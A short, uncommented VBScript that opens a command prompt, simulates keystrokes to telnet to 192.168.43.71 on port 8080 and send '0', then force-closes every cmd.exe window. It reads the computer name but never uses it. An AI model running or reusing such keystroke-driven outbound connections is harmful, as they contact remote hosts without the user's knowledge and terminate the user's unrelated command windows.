Dim oshell : Set oshell =CreateObject("WScript.shell")
Set wshShell = WScript.CreateObject( "WScript.Shell" )

strComputerName = wshShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )

set WshShell = WScript.CreateObject("WScript.Shell") 

WshShell.Run "cmd" 

WScript.Sleep 100 

WshShell.AppActivate "C:\Windows\system32\cmd.exe" 

WshShell.SendKeys "telnet 192.168.43.71 8080{ENTER}" 

set x=createobject("wscript.shell")
x.sendkeys "0 ~"
oshell.Run "taskkill /im cmd.exe",, True
